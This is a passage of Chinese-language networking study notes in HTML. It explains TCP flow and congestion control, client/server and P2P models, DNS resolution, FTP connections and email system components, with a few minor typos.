号报文段已经丢失，这时发送方 <code>A</code> 可以立即对 <code>2</code> 号报文执行重传，这种技术通常称为 <strong>快速重传</strong>。当然，冗余 ACK 还被用在 <a href="#tcp-%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">拥塞控制</a> 中。</p>
</li>
</ul>
</li>
</ol>
<h4> TCP 流量控制</h4>
<p>TCP 提供流量控制服务来消除发送方（发送速率太快）使接收方缓存区溢出的可能性，因此可以说流量控制是一个速度匹配服务（匹配发送方的发送速率与接收方的读取速率）。</p>
<p>TCP 提供一种基于滑动窗口协议的流量控制机制，TCP 使用窗口机制来实现流量控制。</p>
<p>在通信过程中，接收方根据自己接收缓存的大小，动态地调整发送方的发送窗口大小，这称为 <strong>接收窗口 rwnd</strong>，即调整 TCP 报文段首部中的 “窗口” 字段值，来限制发送方向网络注入报文的速率。同时，发送方根据其对当前网络拥塞程度的估计而确定的窗口值，这称为 <strong>拥塞窗口 cwnd</strong>，其大小与网络的带宽和时延密切相关。</p>
<p>例如：在通信中，有效数据只从 <code>A</code> 发往 <code>B</code>，而 <code>B</code> 仅向 <code>A</code> 发送确认报文，这时 <code>B</code> 可以通过设置确认报文段首部的窗口字段来将 rwnd 通知给 <code>A</code>。rwnd 即接收方允许连续接收的最大能力，单位是字节。发送方 <code>A</code> 总是根据最新收到的 rwnd 值来限制自己发送窗口的大小，从而将未确认的数据量控制在 rwnd 大小之内，保证 <code>A</code> 不会使 <code>B</code> 的接收缓存溢出。当然，<code>A</code> 的发送窗口的实际大小取 rwnd 和 cwnd 中的最小值。设 <code>A</code> 向 <code>B</code> 发送数据，在连接建立时，<code>B</code> 告诉 <code>A</code>：“我的接收窗口 <code>rwnd = 400</code>”。接收方主机 <code>B</code> 进行了三次流量控制，这三个报文段都设置了 <code>ACK = 1</code>，只有在 <code>ACK = 1</code> 时确认号字段才有意义。第一次把窗口减小到 <code>rwnd = 300</code>，第二次又减到 <code>rwnd = 100</code>，最后减到 <code>rwnd = 0</code>，即不允许发送方再发送数据。这使得发送方暂停发送的状态将持续到 <code>B</code> 重新发出一个新的窗口值为止。</p>
<div class="hint-container tip">
<p class="hint-container-title">传输层和数据链路层的流量控制的区别</p>
<p>传输层定义端到端用户之间的流量控制，数据链路层定义两个中间的相邻结点的流量控制。另外，数据链路层的滑动窗口协议的窗口大小不能动态变化，传输层的则可以动态变化</p>
</div>
<h4> TCP 拥塞控制</h4>
<p><strong>拥塞控制是指防止过多的数据注入网络，保证网络中的路由器或链路不致过载</strong>。出现拥塞时，端点并不了解拥塞发生的细节，对通信连接的端点来说，拥塞往往表现为通信时延的增加。</p>
<p><strong>拥塞控制与流量控制的区别</strong>：拥塞控制是让网络能够承受现有的网络负荷，是一个全局性的过程，涉及所有的主机、所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是指点对点的通信量的控制，是个端到端的问题（接收端控制发送端），它所要做的是抑制发送端发送数据的速率，以便使接收端来得及接收。当然，拥塞控制和流量控制也有相似的地方，即它们都通过控制发送方发送数据的速率来达到控制效果。</p>
<p>例如：某个链路的传输速率为 <code>10Gb/s</code>，某大型机向一台 PC 以 <code>1Gb/s</code> 的速率传送文件，显然网络的带宽是足够大的，因而不存在拥塞问题，但如此高的发送速率将导致 PC 可能来不及接收，因此必须进行流量控制。但若有 <code>100</code> 万台 PC 在此链路上以 <code>1Mb/s</code> 的速率传送文件，则现在的问题就变为网络的负载是否超过了现有网络所能承受的范围。</p>
<p>因特网建议标准定义了进行 <strong>拥塞控制的四种算法</strong>：慢开始、拥塞避免、快重传和快恢复。</p>
<p>发送方在确定发送报文段的速率时，既要根据接收方的接收能力，又要从全局考虑不要使网络发生拥塞。因此，TCP 协议要求发送方维护以下两个窗口：</p>
<ul>
<li><strong>接收窗口 rwnd</strong>：接收方根据目前接收缓存大小所许诺的最新窗口值，反映接收方的容量。由接收方根据其放在 TCP 报文的首部的窗口字段通知发送方</li>
<li><strong>拥塞窗口 cwnd</strong>：发送方根据自己估算的网络拥塞程度而设置的窗口值，反映网络的当前容量。只要网络未出现拥塞，拥塞窗口就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入网络的分组数</li>
</ul>
<p>发送窗口的上限值应取接收窗口 rwnd 和拥塞窗口 cwnd 中较小的一个，即：<em>发送窗口的上限值 = min[rwnd, cwnd]</em></p>
<p>接收窗口的大小可根据 TCP 报文首部的窗口字段通知发送方，而发送方通过慢开始和拥塞避免维护拥塞窗口。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>这里假设接收方总是有足够大的缓存空间，因而发送窗口大小由网络的拥塞程度决定，也就是说，可以将发送窗口等同为拥塞窗口</p>
</div>
<ol>
<li>
<p><strong>慢开始和拥塞避免</strong></p>
<ul>
<li>
<p><strong>慢开始算法</strong></p>
<p>在 TCP 刚刚连接好并开始发送 TCP 报文段时，先令拥塞窗口 <code>cwnd = 1</code>，即一个最大报文段长度 MSS。每收到一个对新报文段的确认后，将 cwnd 加 <code>1</code>，即增大一个 MSS。用这样的方法逐步增大发送方的 cwnd，可使分组注入网络的速率更加合理。</p>
<p>例如：<code>A</code> 向 <code>B</code> 发送数据，发送方先置拥塞窗口 <code>cwnd = 1</code>，<code>A</code> 发送第一个报文段，<code>A</code> 收到 <code>B</code> 对第一个报文段的确认后，把 cwnd 从 <code>1</code> 增大到 <code>2</code>；于是 <code>A</code> 接着发送两个报文段，<code>A</code> 收到 <code>B</code> 对这两个报文段的确认后，把 cwnd 从 <code>2</code> 增大到 <code>4</code>，下次就可一次发送 <code>4</code> 个报文段。</p>
<p>慢开始的 “慢” 并不是指拥塞窗口 cwnd 的增长速率慢，而是指在 TCP 开始发送报文段时先设置 <code>cwnd = 1</code>，使得发送方在开始时只发送一个报文段（目的是试探下网络的拥塞情况），然后再逐渐增大 cwnd，这对防止网络出现拥塞是一个非常有力的措施。使用慢开始算法后，每经过一个传输轮次（即往返时延 RTT），cwnd 就会加倍，即 cwnd 的值随传输轮次指数规律增长。这样，慢开始一直把 cwnd 增大到一个规定的慢开始门限 <code>ssthresh</code>（阈值），然后改用拥塞避免算法。</p>
</li>
<li>
<p><strong>拥塞避免算法</strong></p>
<p>拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢增大，具体做法是：每经过一个往返时延 RTT 就把发送方的拥塞窗口 cwnd 加 <code>1</code>，而不是加倍，使拥塞窗口 cwnd 按线性规律缓慢增长（即加法增大），这比慢开始算法的拥塞窗口增长速率要缓慢得多。</p>
<p>根据 cwnd 的大小执行不同的算法，可归纳如下：</p>
<ul>
<li>当 <code>cwnd &lt; ssthresh</code> 时，使用慢开始算法</li>
<li>当 <code>cwnd &gt; ssthresh</code> 时，停止使用慢开始算法而改用拥塞避免算法</li>
<li>当 <code>cwnd = ssthresh</code> 时，既可使用慢开始算法，又可使用拥塞避免算法（通常做法）</li>
</ul>
</li>
<li>
<p><strong>网络拥塞的处理</strong></p>
<p>无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（未按时收到确认），就要把慢开始门限 <code>ssthresh</code> 设置为出现拥塞时的发送方的 cwnd 值的一半（但不能小于 <code>2</code>）。然后把拥塞窗口 cwnd 重新设置为 <code>1</code>，执行慢开始算法。这样做的目的是迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完。</p>
<p><strong>慢开始和拥塞避免算法的实现过程：</strong></p>
<ul>
<li>初始时，拥塞窗口置为 <code>1</code>，即 <code>cwnd = 1</code>，慢开始门限置为 <code>16</code>，即 <code>ssthresh = 16</code></li>
<li>慢开始阶段，cwnd 的初值为 <code>1</code>，以后发送方每收到一个确认 ACK，cwnd 值加 <code>1</code>，也即经过每个传输轮次（RTT），cwnd 呈指数规律增长。当拥塞窗口 cwnd 增长到慢开始门限 <code>ssthresh</code> 时（即当 <code>cwnd = 16</code> 时），就改用拥塞避免算法，cwnd 按线性规律增长</li>
<li>假定 <code>cwnd = 24</code> 时网络出现超时，更新 <code>ssthresh</code> 值为 <code>12</code>（即变为超时时 cwnd 值的一半），cwnd 重置为 <code>1</code>，并执行慢开始算法，当 <code>cwnd = 12</code> 时，改为执行拥塞避免算法</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在慢开始（指数级增长阶段，若 <code>2cwnd &gt; ssthresh</code>，则下一个 RTT 后的 cwnd 等于 <code>ssthresh</code>，而不等于 <code>2cwnd</code>，即 cwnd 不能跃过 <code>ssthresh</code> 值</p>
</div>
</li>
</ul>
<p>在慢开始和拥塞避免算法中使用了 “乘法减小” 和 “加法增大” 方法。“乘法减小” 是指不论是在慢开始阶段还是在拥塞避免阶段，只要出现超时（即很可能出现了网络拥塞），就把慢开始门限值 <code>ssthresh</code> 设置为当前拥塞窗口的一半（并执行慢开始算法）。当网络频繁出现拥塞时，<code>ssthresh</code> 值就下降得很快，以大大减少注入网络的分组数。而 “加法增大” 是指执行拥塞避免算法后，在收到对所有报文段的确认后（即经过一个 RTT），就把拥塞窗口 cwnd 增加一个 MSS 大小，使拥塞窗口缓慢增大，以防止网络过早出现拥塞。</p>
<p>拥塞避免并不能完全避免拥塞。利用以上措施要完全避免网络拥塞是不可能的。拥塞避免是指在拥塞避免阶段把拥塞窗口控制为按线性规律增长，使网络比较不容易出现拥塞。</p>
</li>
<li>
<p><strong>快重传和快恢复</strong></p>
<p>快重传和快恢复算法是对慢开始和拥塞避免算法的改进。</p>
<ul>
<li>
<p><strong>快重传</strong></p>
<p>在 TCP 可靠传输机制中，快重传技术使用了冗余 ACK 来检测丢包的发生。同样，冗余 ACK 也用于网络拥塞的检测（丢了包当然意味着网络可能出现了拥塞）。快重传并非取消重传计时器，而是在某些情况下可更早地重传丢失的报文段。</p>
<p>当发送方连续收到三个重复的 ACK 报文时，直接重传对方尚未收到的报文段，而不必等待那个报文段设置的重传计时器超时。</p>
</li>
<li>
<p><strong>快恢复</strong></p>
<p>快恢复算法的原理如下：当发送方连续收到三个冗余 ACK（即重复确认）时，执行 “乘法减小” 算法，把慢开始门限 <code>ssthresh</code> 设置为此时发送方 cwnd 的一半。这是为了预防网络发生拥塞。但发送方现在认为网络很可能没有发生（严重）拥塞，否则就不会有几个报文段连续到达接收方，也不会连续收到重复确认。因此与慢开始不同之处是它把 cwnd 值设置为慢开始门限 <code>ssthresh</code> 改变后的数值，然后开始执行拥塞避免算法（“加法增大”），使拥塞窗口缓慢地线性增大。</p>
<p>由于跳过了拥塞窗口 cwnd 从 <code>1</code> 起始的慢开始过程，所以被称为快恢复。</p>
</li>
</ul>
</li>
</ol>
<p>在流量控制中，发送方发送数据的量由接收方决定，而在拥塞控制中，则由发送方自己通过检测网络状况来决定。实际上，慢开始、拥塞避免、快重传和快恢复几种算法是同时应用在拥塞控制机制中。<strong>四种算法使用的总结</strong>：在 TCP 连接建立和网络出现超时时，采用慢开始和拥塞避免算法；当发送方接收到冗余 ACK 时，采用快重传和快恢复算法。</p>
<p>接收方的缓存空间总是有限的。因此，发送方发送窗口的实际大小由流量控制和拥塞控制共同决定。发送方实际的发送窗口大小是由 rwnd 和 cwnd 中较小的那一个确定的。</p>
<h2> 应用层</h2>
<h3> 网络应用模型</h3>
<h4> 客户/服务器模型</h4>
<p>在客户/服务器（Client/Server，C/S）模型中，有一个总是打开的主机称为 <strong>服务器</strong>，它服务于许多来自其他称为客户机的主机请求。<strong>其工作流程如下：</strong></p>
<ul>
<li>服务器处于接收请求的状态</li>
<li>客户机发出服务请求，并等待接收结果</li>
<li>服务器收到请求后，分析请求，进行必要的处理，得到结果并发送给客户机</li>
</ul>
<p>客户程序必须知道服务器程序的地址，客户机上一般不需要特殊的硬件和复杂的操作系统。而服务器上运行的软件则是专门用来提供某种服务的程序，可同时处理多个远程或本地客户的要求。系统启动后即自动调用并一直不断地运行着，被动地等待并接收来自各地客户的请求。因此，服务器程序不需要知道客户程序的地址。</p>
<p>客户/服务器模型最主要的特征是：客户是服务请求方，服务器是服务提供方。如：Web 应用程序，其中总是打开的 Web 服务器服务于运行在客户机上的浏览器的请求。当 Web 服务器接收到来自客户机对某对象的请求时，它向该客户机发送所请求的对象以做出响应。常见的使用客户/服务器模型的应用包括 Web、文件传输协议（FTP）、远程登录和电子邮件等。</p>
<p><strong>客户/服务器模型的主要特点还有：</strong></p>
<ul>
<li>网络中各计算机的地位不平等，服务器可以通过对用户权限的限制来达到管理客户机的目的，使它们不能随意存储/删除数据，或进行其他受限的网络活动。整个网络的管理工作由少数服务器担当，因此网络的管理非常集中和方便</li>
<li>客户机相互之间不直接通信。例如：在 Web 应用中两个浏览器并不直接通信</li>
<li>可扩展性不佳。受服务器硬件和网络带宽的限制，服务器支持的客户机数有限</li>
</ul>
<h4> P2P 模型</h4>
<p>不难看出，在 C/S 模型中，服务器性能的好坏决定了整个系统的性能，当大量用户请求服务时，服务器就必然成为系统的瓶颈。P2P 模型的思想是整个网络中的传输内容不再被保存在中心服务器上，每个结点都同时具有下载、上传的功能，其权利和义务都是大体对等的。</p>
<p>在 P2P 模型中，各计算机没有固定的客户和服务器划分。相反，任意一对计算机——称为 <strong>对等方（Peer）</strong>，直接相互通信。实际上，P2P 模型从本质上来看仍然使用客户/服务器模式，每个结点既作为客户访问其他结点的资源，也作为服务器提供资源给其他结点访问。当前比较流行的 P2P 应用有 PPlive、Bittorrent 和电驴等。</p>
<p>与 C/S 模型相比，<strong>P2P 模型的优点主要体现如下：</strong></p>
<ul>
<li>减轻了服务器的计算压力，消除了对某个服务器的完全依赖，可以将任务分配到各个结点上，因此大大提高了系统效率和资源利用率（例如：播放流媒体时对服务器的压力过大，而通过 P2P 模型，可以利用大量的客户机来提供服务）</li>
<li>多个客户机之间可以直接共享文档</li>
<li>可扩展性好，传统服务器有响应和带宽的限制，因此只能接受一定数量的请求</li>
<li>网络健壮性强，单个结点的失效不会影响其他部分的结点</li>
</ul>
<p>P2P 模型也有缺点。在获取服务的同时，还要给其他结点提供服务，因此会占用较多的内存，影响整机速度。例如：经常进行 P2P 下载还会对硬盘造成较大的损伤。据某互联网调研机构统计，当前 P2P 程序已占互联网 <code>50%~90%</code>的流量，使网络变得非常拥塞，因此各大 ISP（互联网服务提供商，如：电信、网通等）通常都对 P2P 应用持反对态度。</p>
<h3> 域名系统（DNS）</h3>
<p><strong>域名系统（Domain Name System，DNS）</strong> 是因特网使用的命名系统，用来把便于人们记忆的具有特定含义的主机名（如：<code>www.baidu.com</code>）转换为便于机器处理的 IP 地址。相对于 IP 地址，人们更喜欢使用具有特定含义的字符串来标识因特网上的计算机。值得注意的是，DNS 系统采用客户/服务器模型，其协议运行在 UDP 之上，使用 <code>53</code> 号端口。</p>
<p>从概念上可将 DNS 分为三部分：层次域名空间、域名服务器和解析器。</p>
<h4> 层次域名空间</h4>
<p><strong>因特网采用层次树状结构的命名方法</strong>。采用这种命名方法，任何一个连接到因特网的主机或路由器，都有一个唯一的层次结构名称，即 <strong>域名（Domain Name）</strong>。域（Domain）是名字空间中一个可被管理的划分。域还可以划分为子域，而子域还可以继续划分为子域的子域，这样就形成了 <strong>顶级域、二级域、三级域</strong> 等。每个域名都由标号序列组成，而各标号之间用点 <code>.</code> 隔开。一个典型的例子如：<code>www.baidu.com</code> 它由三个标号组成，其中标号 <code>com</code> 是顶级域名，标号 <code>baidu</code> 是二级域名，标号 <code>www</code> 是三级域名。</p>
<p><strong>关于域名中的标号有以下几点需要注意：</strong></p>
<ul>
<li>标号中的英文不区分大小写</li>
<li>标号中除连字符（<code>-</code>）外不能使用其他的标点符号</li>
<li>每个标号不超过 <code>63</code> 个字符，多标号组成的完整域名最长不超过 <code>255</code> 个字符</li>
<li>级别最低的域名写在最左边，级别最高的顶级域名写在最右边</li>
</ul>
<p><strong>顶级域名（Top Level Domain，TLD）分为如下三大类：</strong></p>
<ul>
<li><strong>国家（地区）顶级域名（nTLD）</strong>：国家和某些地区的域名，如：<code>.cn</code> 表示中国，<code>.us</code> 表示美国，<code>.uk</code> 表示英国</li>
<li><strong>通用顶级域名（gTLD）</strong>：常见的有 <code>.com</code>（公司）、<code>net</code>（网络服务机构）、<code>.org</code>（非营利性组织）和 <code>.gov</code>（国家或政府部门）等</li>
<li><strong>基础结构域名</strong>：这种顶级域名只有一个，即 <code>arpa</code>，用于反向域名解析，因此又称反向域名</li>
</ul>
<p>国家（地区）顶级域名下注册的二级域名均由该国家（地区）自行确定。</p>
<p>在域名系统中，每个域分别由不同的组织进行管理。每个组织都可以将它的域再分成一定数目的子域，并将这些子域委托给其他组织去管理。例如：管理 <code>cn</code> 域的中国将 <code>edu.cn</code> 子域授权给中国教育和科研计算机网（CERN ET）来管理。</p>
<h4> 域名服务器</h4>
<p>因特网的域名系统被设计成一个联机分布式的数据库系统，并采用客户/服务器模型。域名到 IP 地址的解析是由运行在域名服务器上的程序完成的，一个服务器所负责管辖的（或有权限的）范围称为 <strong>区</strong>（不以 “域” 为单位），各单位根据具体情况来划分自己管辖范围的区，但在一个区中的所有结点必须是能够连通的，每个区设置相应的权限域名服务器，用来保存该区中的所有主机的域名到 IP 地址的映射。每个域名服务器不但能够进行一些域名到 IP 地址的解析，而且还必须具有连向其他域名服务器的信息。当自己不能进行域名到 IP 地址的转换时，能够知道到什么地方去找其他域名服务器。</p>
<p>DNS 使用了大量的域名服务器，它们以层次方式组织。没有一台域名服务器具有因特网上所有主机的映射，相反，该映射分布在所有的 DNS 上。采用分布式设计的 DNS，是一个在因特网上实现分布式数据库的精彩范例。<strong>主要有四种类型的域名服务器。</strong></p>
<ol>
<li>
<p><strong>根域名服务器</strong></p>
<p>根域名服务器是最高层次的域名服务器，所有的根域名服务器都知道所有的顶级域名服务器的 IP 地址。根域名服务器也是最重要的域名服务器，不管是哪个本地域名服务器，若要对因特网上任何一个域名进行解析，只要自已无法解析，就首先要求助于根域名服务器。因特网上有 13 个根域名服务器，尽管将这 13 个根域名服务器中的每个都视为单个服务器，但每个 “服务器” 实际上是冗余服务器的集群，以提供安全性和可靠性。需要注意的是，根域名服务器用来管辖顶级域（如：<code>.com</code>），通常它并不直接把待查询的域名直接转换成 IP 地址，而是告诉本地域名服务器下一步应当找哪个顶级域名服务器进行查询。</p>
</li>
<li>
<p><strong>顶级域名服务器</strong></p>
<p>这些域名服务器负责管理在该项级域名服务器注册的所有二级域名。收到 DNS 查询请求时，就给出相应的回答（可能是最后的结果，也可能是下一步应当查找的域名服务器的 IP 地址）。</p>
</li>
<li>
<p><strong>授权域名服务器（权限域名服务器）</strong></p>
<p>每台主机都必须在授权域名服务器处登记。为了更加可靠地工作，一台主机最好至少有两个授权域名服务器。实际上，许多域名服务器都同时充当本地域名服务器和授权域名服务器。授权域名服务器总能将其管辖的主机名转换为该主机的 IP 地址。</p>
</li>
<li>
<p><strong>本地域名服务器</strong></p>
<p>本地域名服务器对域名系统非常重要。每个因特网服务提供者（ISP），或一所大学，甚至一所大学中的各个系，都可以拥有一个本地域名服务器。当一台主机发出 DNS 查询请求时，这个查询请求报文就发送给该主机的本地域名服务器。事实上，在 Windows 系统中配置 “本地连接” 时，就需要填写 DNS 地址，这个地址就是本地 DNS（域名服务器）的地址。</p>
</li>
</ol>
<h4> 域名解析过程</h4>
<p>域名解析是指把域名映射成为 IP 地址或把 IP 地址映射成域名的过程。前者称为 <strong>正向解析</strong>，后者称为 <strong>反向解析</strong>。当客户端需要域名解析时，通过本机的 DNS 客户端构造一个 DNS 请求报文，以 UDP 数据报方式发往本地域名服务器。</p>
<p><strong>域名解析有两种方式</strong>：递归查询和递归与遂代相结合的查询。</p>
<ul>
<li>
<p><strong>主机向本地域名服务器的查询采用的是递归查询</strong></p>
<p>也就是说，如果本地主机所询问的本地域名服务器不知道被查询域名的 IP 地址，那么本地域名服务器就以 DNS 客户的身份，向根域名服务器继续发出查询请求报文（即替该主机继续查询），而不是让该主机自己进行下一步的查询。</p>
<p>假定某客户机想获知域名为 <code>www.baidui.com</code> 主机的 IP 地址，<strong>递归查询的过程如下所示：</strong></p>
<ol>
<li>客户机向其本地域名服务器发出 DNS 请求报文</li>
<li>本地域名服务器收到请求后，查询本地缓存，若没有该记录，则以 DNS 客户的身份向根域名服务器发出解析请求报文</li>
<li>根域名服务器收到请求后，判断该域名属于<code>.com</code> 域，并向对应的顶级域名服务器 <code>dns.com</code> 发送请求</li>
<li>顶级域名服务器 <code>dns.com</code> 收到请求后，判断该域名属于 <code>baidui.com</code> 域，因此向对应的授权域名服务器 <code>dns.baidui.com</code> 发送请求</li>
<li>授权域名服务器 <code>dns.baidui.com</code> 收到请求后，将查询结果 <code>www.baidu.com</code> 的 IP 地址返回给顶级域名服务器</li>
<li>顶级域名服务器将 IP 地址返回给根域名服务器</li>
<li>根域名服务器将 IP 地址返回给本地域名服务器</li>
<li>本地域名服务器将 IP 地址返回给客户机</li>
</ol>
<p>本地域名服务器只需向根域名服务器查询一次，后面的几次查询都是递归地在其他几个域名服务器之间进行的［步骤 <code>3~6</code>］。在步骤 <code>7</code> 中，本地域名服务器从根域名服务器得到了所需的 IP 地址，最后在步骤 <code>8</code> 中，本地域名服务器把查询结果告诉发起查询的客户机。由于该方法给根域名服务造成的负载过大，所以在实际中几乎不使用。</p>
</li>
<li>
<p><strong>本地域名服务器向根域名服务器的查询采用选代查询</strong></p>
<p>当根域名服务器收到本地域名服务器发出的选代查询请求报文时，要么给出所要查询的 IP 地址，要么告诉本地域名服务器：“您下一步应当向哪个顶级域名服务器进行查询”。然后让本地域名服务器向这个顶级域名服务器进行后续的查询。同样，顶级域名服务器收到查询报文后，要么给出所要查询的 IP 地址，要么告诉本地域名服务器下一步应向哪个权限域名服务器查询。最后，知道所要解析的域名的 IP 地址后，把这个结果返回给发起查询的主机。</p>
<p>假定某客户机想获知域名为 <code>www.baidui.com</code> 主机的 IP 地址，<strong>递归与遂代相结合的查询过程如下所示：</strong></p>
<ol>
<li>客户机向其本地域名服务器发出 DNS 请求报文（递归查询）</li>
<li>本地域名服务器收到请求后，查询本地缓存，若没有该记录，则以 DNS 客户的身份向根域名服务器发出解析请求报文（选代查询）</li>
<li>根域名服务器收到请求后，判断该域名属于<code>.com</code> 域，将对应的顶级域名服务器 <code>dns.com</code> 的 IP 地址返回给本地域名服务器</li>
<li>本地域名服务器向顶级域名服务器 <code>dns.com</code> 发出解析请求报文（选代查询）</li>
<li>顶级域名服务器 <code>dns.com</code> 收到请求后，判断该域名属于 <code>baidui.com</code> 域，因此将对应的授权域名服务器 <code>dns.baidui.com</code> 的 IP 地址返回给本地域名服务器</li>
<li>本地域名服务器向授权域名服务器 <code>dns.baidui.com</code> 发起解析请求报文（选代查询）</li>
<li>授权域名服务器 <code>dns.baidui.com</code> 收到请求后，将查询结果返回给本地域名服务器</li>
<li>本地域名服务器将查询结果保存到本地缓存，同时返回给客户机</li>
</ol>
</li>
</ul>
<p>为了提高 DNS 的查询效率，并减少因特网上的 DNS 查询报文数量，在域名服务器中广泛地使用了高速缓存。当一个 DNS 服务器接收到 DNS 查询结果时，它能将该 DNS 信息缓存在高速缓存中。这样，当另一个相同的域名查询到达该 DNS 服务器时，该服务器就能够直接提供所要求的 IP 地址，而不需要再去向其他 DNS 服务器询问。因为主机名和 IP 地址之间的映射不是永久的，所以 DNS 服务器将在一段时间后丢弃高速缓存中的信息。</p>
<h3> 文件传输协议（FTP）</h3>
<h4> FTP 的工作原理</h4>
<p><strong>文件传输协议（File Transfer Protocol，FTP）</strong> 是因特网上使用得最广泛的文件传输协议。FTP 提供交互式的访问，允许客户指明文件的类型与格式，并允许文件具有存取权限。它屏蔽了各计算机系统的细节，因而适合于在异构网络中的任意计算机之间传送文件。</p>
<p><strong>FTP 提供以下功能：</strong></p>
<ul>
<li>提供不同种类主机系统（硬、软件体系等都可以不同）之间的文件传输能力</li>
<li>以用户权限管理的方式提供用户对远程 FTP 服务器上的文件管理能力</li>
<li>以匿名 FTP 的方式提供公用文件共享的能力</li>
</ul>
<p>FTP 采用客户/服务器的工作方式，它使用 TCP 可靠的传输服务。一个 FTP 服务器进程可同时为多个客户进程提供服务。FTP 的服务器进程由两大部分组成：一个主进程，负责接收新的请求；另外有若干从属进程，负责处理单个请求。<strong>其工作步骤如下：</strong></p>
<ol>
<li>打开熟知端口 <code>21</code>（控制端口），使客户进程能够连接上</li>
<li>等待客户进程发连接请求</li>
<li>启动从属进程来处理客户进程发来的请求。主进程与从属进程并发执行，从属进程对客户进程的请求处理完毕后即终止</li>
<li>回到等待状态，继续接收其他客户进程的请求</li>
</ol>
<p>FTP 服务器必须在整个会话期间保留用户的状态信息。特别是服务器必须把指定的用户账户与控制连接联系起来，服务器必须追踪用户在远程目录树上的当前位置。</p>
<h4> 控制连接与数据连接</h4>
<p>FTP 在工作时使用两个并行的 TCP 连接：一个是控制连接（服务器端口号 <code>21</code>），一个是数据连接（服务器端口号 <code>20</code>）。使用两个不同的端口号可以使协议更容易实现。</p>
<ol>
<li>
<p><strong>控制连接</strong></p>
<p>服务器监听 <code>21</code> 号端口，等待客户连接，建立在这个端口上的连接称为 <strong>控制连接</strong>，控制连接用来传输控制信息（如：连接请求、传送请求等），并且控制信息都以 <code>7</code> 位 ASCI 格式传送。FTP 客户发出的传送请求，通过控制连接发送给服务器端的控制进程，但控制连接并不用来传送文件。在传输文件时还可以使用控制连接（如：客户在传输中途发一个中止传输的命令），因此控制连接在整个会话期间一直保持打开状态。</p>
</li>
<li>
<p><strong>数据连接</strong></p>
<p>服务器端的控制进程在接收到 FTP 客户发来的文件传输请求后，就创建 “数据传送进程” 和 “数据连接”。数据连接用来连接客户端和服务器端的数据传送进程，数据传送进程实际完成文件的传送，在传送完毕后关闭 “数据传送连接” 并结束运行。</p>
<p><strong>数据连接有两种传输模式</strong>：主动模式 PORT 和被动模式 PASV。</p>
<ul>
<li><strong>主动模式 PORT 模式的工作原理</strong>：客户端连接到服务器的 <code>21</code> 端口，登录成功后要读取数据时，客户端随机开放一个端口，并发送命令告知服务器，服务器收到 PORT 命令和端口号后，通过 <code>20</code> 端口和客户端开放的端口连接，发送数据</li>
<li><strong>被动模式 PASV 模式的工作原理</strong>：客户端要读取数据时，发送 PASV 命令到服务器，服务器在本地随机开放一个端口，并告知客户端，客户端再连接到服务器开放的端口进行数据传输</li>
</ul>
<p>可见，是用 PORT 模式还是 PASV 模式，选择权在客户端。简单概括为，主动模式传送数据是 “服务器” 连接到 “客户端” 的端口；被动模式传送数据是 “客户端” 连接到 “服务器” 的端口。</p>
</li>
</ol>
<p>因为 FTP 使用了一个分离的控制连接，所以也称 FTP 的控制信息是带外（Out-of-band）传送的。使用 FTP 时，若要修改服务器上的文件，则需要先将此文件传送到本地主机，然后再将修改后的文件副本传送到原服务器，来回传送耗费很多时间。网络文件系统（NFS）采用另一种思路，它允许进程打开一个远程文件，并能在该文件的某个特定位置开始读写数据。这样，NFS 可使用户复制一个大文件中的一个很小的片段，而不需要复制整个大文件。</p>
<h3> 电子邮件</h3>
<h4> 电子邮件系统的组成结构</h4>
<p>自从有了因特网，电子邮件就在因特网上流行起来。电子邮件是一种异步通信方式，通信时不需要双方同时在场。电子邮件把邮件发送到收件人使用的邮件服务器，并放在其中的收件人邮箱中，收件人可以随时上网到自己使用的邮件服务器进行读取。</p>
<p>一个电子邮件系统应具有 <strong>三个最主要的组成构件</strong>，即用户代理（User Agent）、邮件服务器和电子邮件使用的协议，如：SMTP、POP3（或 IMAP）等。</p>
<ul>
<li><strong>用户代理（UA）</strong>：用户与电子邮件系统的接口。用户代理向用户提供一个很友好的接口来发送和接收邮件，用户代理至少应当具有撰写、显示和邮件处理的功能。通常情况下，用户代理就是一个运行在 PC 上的程序（电子邮件客户端软件），常见的有 <code>Outlook</code> 和 <code>Foxmail</code> 等</li>
<li><strong>邮件服务器</strong>：它的功能是发送和接收邮件，同时还要向发信人报告邮件传送的情况（已交付、被拒绝、丢失等）。邮件服务器采用客户/服务器方式工作，但它必须能够同时充当客户和服务器。例如：当邮件服务器 <code>A</code> 向邮件服务器 <code>B</code> 发送邮件时，<code>A</code> 就作为 SMTP 客户，而 <code>B</code> 是 SMTP 服务器；反之，当 <code>B</code> 向 <code>A</code> 发送邮件时，<code>B</code> 就是 SMTP 客户，而 <code>A</code> 就是 SMTP 服务器</li>
<li><strong>邮件发送协议和读取协议</strong>：邮件发送协议用于用户代理向邮件服务器发送邮件或在邮件服务器之间发送邮件，如：SMTP；邮件读取协议用于用户代理从邮件服务器读取邮件，如：POP3。注意，SMTP 用的是 “推”（Push）的通信方式，即用户代理向邮件服务器发送邮件及在邮件服务器之间发送邮件时，SMTP 客户将邮件 “推” 送到 SMTP 服务器。而 POP3 用的是 “拉”（Pull）的通信方式，即用户读取邮件时，用户代理向邮件服务器发出请求，“拉” 取用户邮箱中的邮件。</li>
</ul>
<p><strong>电子邮件的收发过程：</strong></p>
<ol>
<li>发信人调用用户代理来撰写和编辑要发送的邮件。用户代理用 SMTP 把邮件传送给发送端邮件服务器</li>
<li>发送端邮件服务器将邮件放入邮件缓存队列中，等待发送</li>
<li>运行在发送端邮件服务器的 SMTP 客户进程，发现邮件缓存中有待发送的邮件，就向运行在接收端邮件服务器的 SMTP 服务器进程发起建立 TCP 连接</li>
<li>TCP 连接建立后，SMTP 客户进程开始向远程 SMTP 服务器进程发送邮件。当所有待发送邮件发完后，SMTP 就关闭所建立的 TCP 连接</li>
<li>运行在接收端邮件服务器中的 SMTP 服务器进程收到邮件后，将邮件放入收信人的用户邮箱，等待收信人在方便时进行读取</li>
<li>收信人打算收信时，调用用户代理，使用 POP3（或 IMAP）协议将自已的邮件从接收端邮件服务器的用户邮箱中取回（如果邮箱中有来信的话）</li>
</ol>
<h4> 电子邮件格式与 MIME</h4>
